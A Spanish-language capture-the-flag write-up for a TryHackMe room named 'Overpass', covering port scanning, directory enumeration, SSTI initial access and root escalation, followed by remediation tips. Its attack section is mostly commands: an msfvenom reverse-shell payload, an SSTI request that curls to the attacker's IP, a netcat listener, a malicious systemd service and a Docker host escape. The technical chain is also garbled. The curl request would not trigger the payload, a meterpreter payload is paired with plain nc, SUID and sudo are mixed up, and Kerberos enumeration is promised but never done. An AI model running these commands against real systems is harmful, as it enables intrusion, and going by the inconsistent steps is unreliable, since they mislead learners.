# Overpass

**Conceptos clave:** Gobuster discovery, Nginx misconfiguration, PHP SSTI, reverse shell via crafted payload, SUID abuse, Docker escape, Kerberos SPNs enumeration.
**Dificultad:** 🟢 Fácil
**Plataforma:** TryHackMe
**Fecha:** 19 de noviembre de 2026

## 1. Reconocimiento (Recon)

### 1.1 Escaneo rápido de puertos
```bash
nmap -p- --open -T5 -v -n <IP>
```

### 1.2 Escaneo completo con versiones y scripts NSE
```bash
nmap -sS -sV -A -T4 -p- -oN nmap_full.txt <IP>
```

### 1.3 Enumeración web
```bash
# Gobuster descubre la ruta /admin y /uploads

gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt \
    -t 50 -x php,html,js,txt -s "200,301,302,403"
```
La ruta **/admin** mostraba una página de gestión de Nginx con una vulnerabilidad de **Server‑Side Template Injection (SSTI)** en un parámetro `q`.

## 2. Acceso Inicial (Initial Access)

### 2.1 Exploit SSTI para obtener reverse shell
```bash
# Payload PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f raw > payload.phtml
```
Se envió el payload mediante la petición `GET /admin?q={{system('curl http://<TU_IP>:4444 -d @payload.phtml')}}`.

### 2.2 Listener
```bash
nc -nlvp 4444
```
Obtenimos una **shell interactiva** como usuario `overpass`.

### 2.3 Flag de usuario
```bash
cat /home/overpass/user.txt
```

## 3. Escalada de Privilegios (Privilege Escalation)

### 3.1 Enumeración de binarios SUID
```bash
find / -perm -4000 -type f 2>/dev/null | grep -E "(systemctl|docker)"
```
Se encontró `/bin/systemctl` y `/usr/bin/docker` con SUID.

### 3.2 Abuse de `systemctl` con service file
```bash
cat <<EOF | sudo tee /etc/systemd/system/evil.service
[Unit]
Description=Evil Service

[Service]
ExecStart=/bin/bash -c 'bash -p'

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable evil.service
sudo systemctl start evil.service
```
El servicio lanzó `bash -p` como **root**.

### 3.3 Docker escape (alternativa) 
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```
Obtenemos acceso al host como **root**.

### 3.4 Flag de root
```bash
cat /root/root.txt
```

## 4. Post‑Explotación / Cracking
(No se requirió extracción de hashes ni cracking.)

## 5. Flags
| Flag | Ruta |
|------|------|
| `user.txt` | `/home/overpass/user.txt` |
| `root.txt` | `/root/root.txt` |

## 6. Mitigación / Remediación
- **Validar plantillas**: desactivar funcionalidades de renderizado dinámico o sanitizar estrictamente los parámetros que se evalúan.
- **Hardening de `systemctl`**: eliminar SUID o restringir su uso mediante `sudoers`.
- **Docker**: ejecutar contenedores sin privilegios, usar `user‑ns‑remap` y no montar el host completo.
- **Actualizaciones**: mantener Nginx y PHP actualizados para evitar SSTI.
- **Principio de menor privilegio**: revisar binarios SUID y eliminar los que no sean necesarios.

*Escrito por Juan Merino Garrido – Estudiante de Ingeniería Informática*